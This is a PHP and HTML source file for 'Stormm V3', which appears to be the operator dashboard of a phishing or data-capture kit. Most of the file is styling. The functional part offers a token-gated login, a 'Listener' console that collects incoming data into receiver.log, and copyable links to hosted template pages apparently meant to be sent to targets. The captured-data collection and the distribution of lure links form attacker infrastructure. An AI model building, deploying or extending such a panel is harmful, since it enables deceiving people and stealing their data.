<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#1d2327">
    <meta name="msapplication-TileColor" content="#1d2327">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link href="./assets/css/style.css" rel="stylesheet">
    <title>Stormm - Dashboard</title>
    <style>
        :root {
            --wp-admin-sidebar-bg: #1d2327;
            --wp-admin-sidebar-color: #f0f0f1;
            --wp-admin-sidebar-hover: #2c3338;
            --wp-admin-content-bg: #f0f0f1;
            --wp-admin-card-bg: #ffffff;
            --wp-admin-border: #dcdcde;
            --wp-admin-primary: #2271b1;
            --wp-admin-primary-hover: #135e96;
            --wp-admin-danger: #d63638;
            --wp-admin-success: #00a32a;
            --wp-admin-warning: #dba617;
            --wp-admin-text: #3c434a;
            --wp-admin-muted: #646970;
            --wp-admin-topbar-height: 60px;
            --wp-admin-sidebar-width: 180px;
        }

        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            padding: 0;
            background: var(--wp-admin-content-bg);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
        }

        #ourbody {
            background: var(--wp-admin-content-bg);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .wrapper {
            margin: 0;
            padding: 0;
            display: flex;
            min-height: calc(100vh - var(--wp-admin-topbar-height));
        }

        /* Admin Bar */
        .wp-adminbar {
            height: var(--wp-admin-topbar-height);
            background: #1d2327;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 1px 3px rgba(0,0,0,0.15);
        }

        .wp-adminbar-brand {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            color: #fff;
            text-decoration: none;
        }

        .wp-adminbar-brand i {
            font-size: 1.4rem;
            color: #72d572;
        }

        .wp-adminbar-actions {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .wp-adminbar-badge {
            background: var(--wp-admin-danger);
            color: #fff;
            font-size: 0.7rem;
            padding: 3px 8px;
            border-radius: 10px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .wp-adminbar-version {
            font-size: 0.78rem;
            color: #a7aaad;
        }

        .wp-adminbar-btn {
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.15);
            color: #fff;
            padding: 6px 12px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 0.8rem;
            transition: all 0.2s ease;
        }

        .wp-adminbar-btn:hover {
            background: rgba(255,255,255,0.2);
            color: #fff;
        }

        /* Sidebar */
        .wp-sidebar {
            width: var(--wp-admin-sidebar-width);
            background: var(--wp-admin-sidebar-bg);
            color: var(--wp-admin-sidebar-color);
            min-height: calc(100vh - var(--wp-admin-topbar-height));
            position: sticky;
            top: var(--wp-admin-topbar-height);
            padding: 0;
            flex-shrink: 0;
            display: flex;
            flex-direction: column;
        }

        .wp-sidebar-nav {
            list-style: none;
            margin: 0;
            padding: 12px 0;
        }

        .wp-sidebar-nav li {
            margin: 0;
        }

        .wp-sidebar-nav a {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 18px;
            color: var(--wp-admin-sidebar-color);
            font-size: 0.85rem;
            text-decoration: none;
            transition: background 0.15s ease;
            border-left: 3px solid transparent;
        }

        .wp-sidebar-nav a:hover,
        .wp-sidebar-nav a.active {
            background: var(--wp-admin-sidebar-hover);
            border-left-color: var(--wp-admin-primary);
            color: #fff;
        }

        .wp-sidebar-nav a i {
            width: 18px;
            text-align: center;
            font-size: 0.9rem;
            opacity: 0.8;
        }

        .wp-sidebar-section-title {
            font-size: 0.72rem;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            color: #787c82;
            padding: 16px 18px 6px;
            font-weight: 600;
        }

        .wp-sidebar-bottom {
            margin-top: auto;
            padding: 12px 18px;
            border-top: 1px solid rgba(255,255,255,0.08);
        }

        .wp-sidebar-info {
            font-size: 0.75rem;
            color: #787c82;
            line-height: 1.5;
        }

        /* Main Content */
        .wp-content {
            flex: 1;
            padding: 24px;
            max-width: calc(100% - var(--wp-admin-sidebar-width));
            background: var(--wp-admin-content-bg);
            overflow-y: auto;
        }

        .wp-page-title {
            font-size: 1.4rem;
            font-weight: 500;
            color: #1d2327;
            margin: 0 0 6px 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .wp-page-subtitle {
            font-size: 0.85rem;
            color: var(--wp-admin-muted);
            margin: 0 0 24px 0;
        }

        /* Dashboard Grid */
        .wp-dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 24px;
        }

        .wp-card {
            background: var(--wp-admin-card-bg);
            border: 1px solid var(--wp-admin-border);
            border-radius: 4px;
            padding: 20px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
            transition: box-shadow 0.2s ease;
        }

        .wp-card:hover {
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
        }

        .wp-card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid #f0f0f1;
        }

        .wp-card-title {
            font-size: 0.9rem;
            font-weight: 600;
            color: #1d2327;
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 0;
        }

        .wp-card-title i {
            color: var(--wp-admin-primary);
            font-size: 1rem;
        }

        .wp-card-status {
            font-size: 0.75rem;
            font-weight: 500;
            padding: 4px 10px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .wp-card-status.active {
            background: #edfaef;
            color: var(--wp-admin-success);
        }

        .wp-card-status.inactive {
            background: #fef0f0;
            color: var(--wp-admin-danger);
        }

        .wp-card-status.warning {
            background: #fcf6e1;
            color: var(--wp-admin-warning);
        }

        /* Logger Console */
        .wp-console-wrapper {
            background: #1e1e1e;
            border: 1px solid #323232;
            border-radius: 6px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
        }

        .wp-console-header {
            background: #2d2d2d;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #3e3e3e;
        }

        .wp-console-title {
            color: #cccccc;
            font-size: 0.78rem;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .wp-console-dots {
            display: flex;
            gap: 6px;
        }

        .wp-console-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }

        .wp-console-dot.red { background: #ff5f57; }
        .wp-console-dot.yellow { background: #febc2e; }
        .wp-console-dot.green { background: #28c840; }

        #result {
            width: 100%;
            min-height: 400px;
            background: #1e1e1e;
            color: #d4d4d4;
            border: none;
            border-radius: 0;
            padding: 20px;
            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
            font-size: 0.82rem;
            line-height: 1.6;
            resize: vertical;
            outline: none;
        }

        #result:focus {
            box-shadow: none;
            border: none;
        }

        #result::placeholder {
            color: #6e7681;
        }

        /* Action Bar */
        .wp-action-bar {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 16px;
            padding: 16px 20px;
            background: #fff;
            border: 1px solid var(--wp-admin-border);
            border-radius: 4px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
        }

        .wp-btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 16px;
            font-size: 0.82rem;
            font-weight: 500;
            border-radius: 4px;
            border: 1px solid transparent;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.2s ease;
            font-family: inherit;
            line-height: 1.4;
        }

        .wp-btn i {
            font-size: 0.85rem;
        }

        .wp-btn-primary {
            background: var(--wp-admin-primary);
            color: #fff;
            border-color: var(--wp-admin-primary);
        }

        .wp-btn-primary:hover {
            background: var(--wp-admin-primary-hover);
            border-color: var(--wp-admin-primary-hover);
            color: #fff;
        }

        .wp-btn-danger {
            background: var(--wp-admin-danger);
            color: #fff;
            border-color: var(--wp-admin-danger);
        }

        .wp-btn-danger:hover {
            background: #b02a2c;
            border-color: #b02a2c;
            color: #fff;
        }

        .wp-btn-success {
            background: #fff;
            color: var(--wp-admin-success);
            border-color: var(--wp-admin-success);
        }

        .wp-btn-success:hover {
            background: #f0faf2;
            color: #008800;
        }

        .wp-btn-warning {
            background: #fff;
            color: #b8860b;
            border-color: #d4af37;
        }

        .wp-btn-warning:hover {
            background: #fffbf0;
        }

        .wp-btn-listening {
            animation: pulse-glow 2s infinite;
        }

        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 0 0 rgba(214, 54, 56, 0.4); }
            50% { box-shadow: 0 0 0 6px rgba(214, 54, 56, 0); }
        }

        /* Links Section */
        .wp-links-section {
            margin-top: 24px;
        }

        .wp-card-links {
            background: var(--wp-admin-card-bg);
            border: 1px solid var(--wp-admin-border);
            border-radius: 4px;
            overflow: hidden;
        }

        .wp-card-links .wp-card-header {
            border-bottom: 1px solid var(--wp-admin-border);
            background: #f6f7f7;
        }

        .wp-link-list {
            list-style: none;
            margin: 0;
            padding: 0;
        }

        .wp-link-list li {
            border-bottom: 1px solid #f0f0f1;
        }

        .wp-link-list li:last-child {
            border-bottom: none;
        }

        .wp-link-list .link-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 20px;
            text-decoration: none;
            color: var(--wp-admin-text);
            font-size: 0.82rem;
            transition: background 0.15s ease;
        }

        .wp-link-list .link-item:hover {
            background: #f6f7f7;
        }

        .wp-link-url {
            font-family: "SFMono-Regular", Consolas, monospace;
            font-size: 0.78rem;
            color: var(--wp-admin-muted);
            background: #f0f0f1;
            padding: 4px 10px;
            border-radius: 3px;
            border: 1px solid #e0e0e0;
        }

        .copy-btn {
            background: #fff;
            border: 1px solid #8c8f94;
            color: #50575e;
            padding: 4px 10px;
            border-radius: 3px;
            font-size: 0.78rem;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: inherit;
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .copy-btn:hover {
            background: #f6f7f7;
            border-color: #646970;
            color: #1d2327;
        }

        /* Stats Row */
        .wp-stats-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .wp-stat-box {
            background: var(--wp-admin-card-bg);
            border: 1px solid var(--wp-admin-border);
            border-radius: 4px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            gap: 14px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
        }

        .wp-stat-icon {
            width: 40px;
            height: 40px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.1rem;
        }

        .wp-stat-icon.blue {
            background: #e7f0fa;
            color: var(--wp-admin-primary);
        }

        .wp-stat-icon.green {
            background: #edfaef;
            color: var(--wp-admin-success);
        }

        .wp-stat-icon.red {
            background: #fef0f0;
            color: var(--wp-admin-danger);
        }

        .wp-stat-icon.orange {
            background: #fef8e7;
            color: #dba617;
        }

        .wp-stat-info {
            display: flex;
            flex-direction: column;
        }

        .wp-stat-value {
            font-size: 1.3rem;
            font-weight: 600;
            color: #1d2327;
            line-height: 1.2;
        }

        .wp-stat-label {
            font-size: 0.75rem;
            color: var(--wp-admin-muted);
            font-weight: 400;
        }

        /* Footer */
        .wp-footer {
            text-align: center;
            padding: 16px;
            color: var(--wp-admin-muted);
            font-size: 0.75rem;
        }

        .wp-footer a {
            color: var(--wp-admin-primary);
            text-decoration: none;
        }

        .wp-footer a:hover {
            text-decoration: underline;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .wp-sidebar {
                display: none;
            }
            .wp-content {
                padding: 16px;
                max-width: 100%;
            }
            .wp-action-bar {
                flex-direction: column;
                align-items: stretch;
            }
            .wp-btn {
                justify-content: center;
            }
            .wp-dashboard-grid {
                grid-template-columns: 1fr;
            }
            .wp-stats-row {
                grid-template-columns: repeat(2, 1fr);
            }
            .wp-adminbar-brand span {
                display: none;
            }
        }

        @media (max-width: 480px) {
            .wp-stats-row {
                grid-template-columns: 1fr;
            }
            .wp-adminbar {
                padding: 0 12px;
            }
        }
    </style>
</head>

<body id="ourbody" onload="check_new_version()">

<div class="wrapper">
    <!-- Top Admin Bar -->
    <div class="wp-adminbar">
        <div class="wp-adminbar-brand">
            <i class="fas fa-shield-halved"></i>
            <span>Stormm</span>
            <span class="wp-adminbar-badge"><i class="fas fa-circle" style="font-size:6px"></i> V3</span>
        </div>
        <div class="wp-adminbar-actions">
            <span class="wp-adminbar-version"><i class="fas fa-code-branch"></i> Panel Active</span>
            <a href="login.php" class="wp-adminbar-btn"><i class="fas fa-arrow-right-from-bracket"></i> Logout</a>
        </div>
    </div>

    <div style="display:flex; width:100%; min-height:calc(100vh - 60px);">
        <!-- Sidebar -->
        <aside class="wp-sidebar">
            <ul class="wp-sidebar-nav">
                <div class="wp-sidebar-section-title">Main Menu</div>
                <li><a href="#" class="active"><i class="fas fa-gauge-high"></i> Dashboard</a></li>
                <li><a href="#"><i class="fas fa-satellite-dish"></i> Listener</a></li>
                <li><a href="#"><i class="fas fa-link"></i> Links</a></li>
                <li><a href="#"><i class="fas fa-file-lines"></i> Logs</a></li>

                <div class="wp-sidebar-section-title">Tools</div>
                <li><a href="#"><i class="fas fa-download"></i> Export</a></li>
                <li><a href="#"><i class="fas fa-gear"></i> Settings</a></li>
                <li><a href="#"><i class="fas fa-rotate"></i> Update</a></li>
            </ul>
            <div class="wp-sidebar-bottom">
                <div class="wp-sidebar-info">
                    <i class="fas fa-shield-halved"></i> Secure Connection<br>
                    <small style="color:#626262;">Token: <?php echo substr($key['token'], 0, 12); ?>...</small>
                </div>
            </div>
        </aside>

        <!-- Main Content -->
        <main class="wp-content">
            <h1 class="wp-page-title"><i class="fas fa-gauge-high" style="color:var(--wp-admin-primary);"></i> Dashboard</h1>
            <p class="wp-page-subtitle">Real-time listener status and activity monitoring</p>

            <!-- Stats Row -->
            <div class="wp-stats-row">
                <div class="wp-stat-box">
                    <div class="wp-stat-icon blue"><i class="fas fa-satellite-dish"></i></div>
                    <div class="wp-stat-info">
                        <span class="wp-stat-value" id="listener-status">Running</span>
                        <span class="wp-stat-label">Listener Status</span>
                    </div>
                </div>
                <div class="wp-stat-box">
                    <div class="wp-stat-icon green"><i class="fas fa-link"></i></div>
                    <div class="wp-stat-info">
                        <span class="wp-stat-value" id="templates-count">-</span>
                        <span class="wp-stat-label">Active Templates</span>
                    </div>
                </div>
                <div class="wp-stat-box">
                    <div class="wp-stat-icon orange"><i class="fas fa-file-lines"></i></div>
                    <div class="wp-stat-info">
                        <span class="wp-stat-value" id="log-lines">0</span>
                        <span class="wp-stat-label">Log Entries</span>
                    </div>
                </div>
                <div class="wp-stat-box">
                    <div class="wp-stat-icon red"><i class="fas fa-shield"></i></div>
                    <div class="wp-stat-info">
                        <span class="wp-stat-value">Secured</span>
                        <span class="wp-stat-label">Session</span>
                    </div>
                </div>
            </div>

            <!-- Console Panel -->
            <div class="wp-dashboard-grid" style="grid-template-columns: 1fr;">
                <div class="wp-card">
                    <div class="wp-card-header">
                        <h3 class="wp-card-title"><i class="fas fa-terminal"></i> Live Console Output</h3>
                        <span class="wp-card-status active" id="console-status-indicator"><i class="fas fa-circle" style="font-size:6px"></i> Listening</span>
                    </div>
                    <div class="wp-console-wrapper">
                        <div class="wp-console-header">
                            <div class="wp-console-title">
                                <div class="wp-console-dots">
                                    <span class="wp-console-dot red"></span>
                                    <span class="wp-console-dot yellow"></span>
                                    <span class="wp-console-dot green"></span>
                                </div>
                                receiver.log
                            </div>
                        </div>
                        <textarea class="form-control" placeholder="Waiting for data..." id="result" rows="14"></textarea>
                    </div>
                    <div class="wp-action-bar">
                        <button class="wp-btn wp-btn-danger" id="btn-listen">
                            <i class="fas fa-stop-circle"></i> Listener Runing / press to stop
                        </button>
                        <button class="wp-btn wp-btn-success" onclick="saveTextAsFile(result.value,'log.txt')">
                            <i class="fas fa-download"></i> Download Logs
                        </button>
                        <button class="wp-btn wp-btn-warning" id="btn-clear">
                            <i class="fas fa-trash-can"></i> Clear Logs
                        </button>
                    </div>
                </div>
            </div>

            <!-- Links Section -->
            <div class="wp-links-section">
                <div class="wp-card-links">
                    <div class="wp-card-header">
                        <h3 class="wp-card-title"><i class="fas fa-link"></i> Active Template Links</h3>
                        <span class="wp-card-status warning" id="links-indicator"><i class="fas fa-circle" style="font-size:6px"></i> Loading...</span>
                    </div>
                    <ul class="wp-link-list" id="links">
                        <?php
                        if(isset($_GET['debug'])){
                            echo '<li><span class="link-item">Loading templates...</span></li>';
                        }
                        ?>
                    </ul>
                </div>
            </div>
        </main>
    </div>
</div>

<!-- Footer -->
<div class="wp-footer">
    Stormm V3 &mdash; Dashboard Panel
</div>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>
<script>
(function(){
    var templateCountEl = document.getElementById('templates-count');
    var logLinesEl = document.getElementById('log-lines');
    var linksStatusEl = document.getElementById('links-indicator');
    var listenerStatusEl = document.getElementById('listener-status');
    var defaultStateHtml = '<li><span class="link-item" style="color:#646970;">Waiting for templates...</span></li>';

    if(linksStatusEl){
        linksStatusEl.className = 'wp-card-status warning';
        linksStatusEl.innerHTML = '<i class="fas fa-circle" style="font-size:6px"></i> Loading';
    }

    setInterval(function(){
        var currentLogs = totalLogLine();
        if(logLinesEl) logLinesEl.textContent = currentLogs;
    }, 1000);

    function totalLogLine(){
        var val = document.getElementById('result').value;
        if (!val) return 0;
        return val.split(/\r\n|\r|\n/).filter(function(line){ return line.trim() !== ""; }).length;
    }

    function renderTemplates(data){
        var json = typeof data === 'string' ? JSON.parse(data) : data;
        var container = $("#links");
        container.empty();

        if(json.length === 0){
            container.append('<li><span class="link-item" style="color:#646970;">No templates available</span></li>');
            if(linksStatusEl){
                linksStatusEl.className = 'wp-card-status inactive';
                linksStatusEl.innerHTML = '<i class="fas fa-circle" style="font-size:6px"></i> Empty';
            }
            if(templateCountEl) templateCountEl.textContent = '0';
            return;
        }

        if(linksStatusEl){
            linksStatusEl.className = 'wp-card-status active';
            linksStatusEl.innerHTML = '<i class="fas fa-circle" style="font-size:6px"></i> Online';
        }
        if(templateCountEl) templateCountEl.textContent = json.length;

        for(var i = 0; i < json.length; i++){
            var url = "http://" + location.host + "/templates/" + json[i] + "/index.html";
            var li = '<li>' +
                '<span class="link-item">' +
                '<span title="' + url + '">' + url + '</span>' +
                '<button class="copy-btn" data-url="' + url + '"><i class="fas fa-copy"></i> Copy</button>' +
                '</span>' +
            '</li>';
            container.append(li);
        }

        $(".copy-btn").off('click').on('click', function(){
            var url = $(this).data("url");
            if(!url) return;
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(url).then(function(){
                    setCopiedState($('[data-url="' + url + '"]'));
                });
            } else {
                fallbackCopy(url);
                setCopiedState($('[data-url="' + url + '"]'));
            }
        });
    }

    function setCopiedState(btn){
        if(!btn || !btn.length) return;
        var original = btn.html();
        btn.prop('disabled', true).html('<i class="fas fa-check"></i> Copied');
        setTimeout(function(){
            btn.prop('disabled', false).html(original);
        }, 2000);
    }

    function fallbackCopy(text){
        var ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.opacity = '0';
        document.body.appendChild(ta);
        ta.select();
        try { document.execCommand('copy'); } catch(e){}
        document.body.removeChild(ta);
    }

    $(document).ready(function(){
        $("#links").html(defaultStateHtml);

        $.ajax({
            url: 'list_templates.php',
            method: 'GET',
            dataType: 'text',
            success: function(data){
                try {
                    renderTemplates(data);
                } catch(e) {
                    console.error('Template parse error:', e);
                    $("#links").html('<li><span class="link-item" style="color:#d63638;">Template data error</span></li>');
                    if(linksStatusEl){
                        linksStatusEl.className = 'wp-card-status inactive';
                        linksStatusEl.innerHTML = '<i class="fas fa-circle" style="font-size:6px"></i> Error';
                    }
                }
            },
            error: function(xhr, status, err){
                console.error('Template load error:', status, err);
                $("#links").html('<li><span class="link-item" style="color:#d63638;">Failed to load templates (' + status + ')</span></li>');
                if(linksStatusEl){
                    linksStatusEl.className = 'wp-card-status inactive';
                    linksStatusEl.innerHTML = '<i class="fas fa-circle" style="font-size:6px"></i> Error';
                }
            }
        });
    });
})();
</script>

</body>
</html>
